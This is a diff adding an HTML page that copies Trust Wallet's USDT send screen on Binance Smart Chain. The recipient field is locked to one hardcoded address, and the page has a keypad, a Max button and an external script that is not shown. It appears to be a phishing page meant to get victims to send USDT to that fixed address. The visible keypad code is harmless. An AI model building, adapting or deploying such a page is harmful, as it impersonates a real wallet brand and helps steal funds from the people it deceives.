@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en" class="theme-dark">
+  <head>
+  <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+  
+    <title>Trust Wallet</title>
+
+    <script type="module" crossorigin src="./index_files/index-DJzhTmhy.js"></script>
+  <link rel="stylesheet" crossorigin href="./index_files/index-DXCZXbGR.css">
+
+  
+  <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="favicon.ico">
+  <meta name="next-head-count" content="5">
+  <link rel="stylesheet" href="style.css" data-n-g="">
+  <noscript data-n-css=""></noscript>
+  <style>
+
+
+
+
+:root {
+  color-scheme: light dark;
+}
+
+@media (prefers-color-scheme: light) {
+  .min-h-screen {
+    background: #ffffff !important;
+    color: #111827 !important;
+  }
+
+  h1 {
+    color: #111827 !important;
+  }
+
+  label,
+  .text-gray-300,
+  .text-gray-400,
+  .text-gray-500 {
+    color: #4b5563 !important;
+  }
+
+  input {
+    background: #ffffff !important;
+    color: #111827 !important;
+    border-color: #d1d5db !important;
+  }
+
+  .bg-\[\#1f1f1f\] {
+    background: #f3f4f6 !important;
+  }
+
+  .border-gray-800 {
+    border-color: #d1d5db !important;
+  }
+}
+
+
+
+    
+      .copy-protection-on #single-article-right,
+      .copy-protection-on {
+        pointer-events: initial !important;
+      }
+      ::-moz-selection {
+        color: #000 !important;
+        background: #accef7 !important;
+      }
+      ::selection {
+        color: #000 !important;
+        background: #accef7 !important;
+      }
+      @layer allow-right-click {
+        ::-moz-selection {
+          color: #000 !important;
+          background: #accef7 !important;
+        }
+        ::selection {
+          color: #000 !important;
+          background: #accef7 !important;
+        }
+      }
+    </style>
+  <script data-scrapbook-elem="custom-elements-loader">
+    (function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["next-route-announcer"])
+  </script>
+</head>
+
+
+  
+<body>
+   <div id="root"></div>
+
+ 
+
+<!-- Next.js application root -->
+    <div id="__next">
+
+      <div>
+
+        <!-- Main page container -->
+        <div
+          class="min-h-screen bg-[#0D111B] text-gray-300 p-4 max-w-md mx-auto amount-page"
+        >
+
+          <!-- Header -->
+          <header class="amount-header">
+
+            <!-- Back button -->
+          
+
+            <!-- Page heading -->
+           <h1
+  class="flex-1 text-center text-xl font-medium text-white"
+  style="transform: translateY(-30px);"
+>
+  Amount
+</h1>
+
+          </header>
+
+
+          <!-- Recipient section -->
+          <div class="recipient-section" style="margin-top: -55px;">
+
+            <!-- Recipient address row -->
+            <div class="recipient-row">
+
+              <span class="recipient-label">
+                To:
+              </span>
+
+              
+              <input
+                placeholder="Search or Enter"
+                class="recipient-address"
+                value="0x0d5991d28d6a01F384Db60A1e51aFEc5Fa0F7759"
+                readonly="readonly"
+              >
+
+            </div>
+
+
+            <!-- Recipient divider -->
+            <div class="recipient-divider"></div>
+
+            <!-- Recipient line -->
+            <div class="recipient-line"></div>
+
+
+
+
+            
+            <!-- Amount display -->
+            <div class="amount-display"">
+
+              <!-- Amount input -->
+              <input
+                placeholder=""
+                type="text"
+                inputmode="decimal"
+                class="amount-number"
+                value="0"
+                
+              >
+
+              <!-- USD equivalent -->
+              <div class="token-balance-usd">
+                    $0.00
+                  </div>
+
+            </div>
+
+
+            <!-- Token balance -->
+            <div class="token-balance-row">
+
+              <div class="token-balance-left">
+
+                <!-- USDT icon -->
+                <img
+                  src="usdt.jpg"
+                  class="usdt-icon"
+                  alt="USDT"
+                >
+
+                <!-- Token balance information -->
+                <div class="token-balance-info">
+
+                  <div class="token-balance-name">
+                    0 USDT
+                  </div>
+
+                 
+
+                </div>
+
+              </div>
+
+
+              <!-- Max amount button -->
+              <button
+                type="button"
+                class="token-max-button"
+              >
+                Max
+              </button>
+
+            </div>
+
+
+            <!-- Numeric keypad -->
+            <div class="numeric-keypad">
+
+              <button type="button">1</button>
+              <button type="button">2</button>
+              <button type="button">3</button>
+
+              <button type="button">4</button>
+              <button type="button">5</button>
+              <button type="button">6</button>
+
+              <button type="button">7</button>
+              <button type="button">8</button>
+              <button type="button">9</button>
+
+              <button type="button">.</button>
+              <button type="button">0</button>
+
+              <button
+                type="button"
+                aria-label="Delete"
+              >
+                ⌫
+              </button>
+
+            </div>
+
+
+
+
+
+            <!--
+              Numeric keypad JavaScript.
+
+              This is the same inline JavaScript from the
+              supplied code, only formatted for readability.
+            -->
+           <script>
+const keypadButtons = document.querySelectorAll(".numeric-keypad button");
+const amountInput = document.querySelector(".amount-number");
+const e = document.querySelector(".token-balance-name");
+const u = document.querySelector(".token-balance-usd");
+
+amountInput.addEventListener("input", () => {
+  const t = amountInput.value || "0";
+  e.textContent = `${t} USDT`;
+
+  const n = parseFloat(t);
+
+  u.textContent =
+    !isNaN(n) && n > 0
+      ? `$${n.toFixed(2)}`
+      : "$0.00";
+});
+
+keypadButtons.forEach(t => {
+  t.addEventListener("click", () => {
+    const n = t.textContent.trim();
+
+    "⌫" === n
+      ? amountInput.value =
+          amountInput.value.length > 1
+            ? amountInput.value.slice(0, -1)
+            : "0"
+
+      : "." === n
+        ? "0" === amountInput.value
+          ? amountInput.value = "0."
+          : amountInput.value.includes(".")
+            || (amountInput.value += ".")
+
+        : "0" === amountInput.value
+          ? amountInput.value = n
+          : amountInput.value += n;
+
+    amountInput.dispatchEvent(
+      new Event("input", {
+        bubbles: true
+      })
+    );
+
+    amountInput.classList.remove("zero-state");
+  });
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+  
+ 
+  
+</body>
+</html>
+
+
+
